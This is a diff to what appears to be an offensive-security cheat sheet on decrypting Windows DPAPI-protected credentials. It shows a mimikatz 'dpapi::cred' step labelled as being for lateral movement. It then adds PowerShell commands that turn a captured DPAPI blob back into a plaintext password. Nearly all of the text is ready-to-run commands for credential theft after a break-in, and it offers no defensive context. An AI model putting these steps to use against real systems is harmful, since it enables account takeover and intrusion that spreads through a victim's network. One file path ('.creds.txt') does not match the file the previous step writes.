@@ -23,3 +23,16 @@
 ## 5) Decrypt the credentials for lateral movement
 
     dpapi::cred /in:C:\Users\USER\AppData\Roaming\Microsoft\credentials\XXXXXXXXXXXXX /guidMasterkey::GUID_MASTERKEY
+
+### Alternate scenario: DPAPI Encrypted blob detected
+
+## 1) Add the blob to a text file
+
+    echo 'DPAPI_BLOB' > creds.txt
+
+## 2) Decrypt creds
+
+    $pw = Get-Content .creds.txt | ConvertTo-SecureString
+    $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)
+    $UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
+    $UnsecurePassword
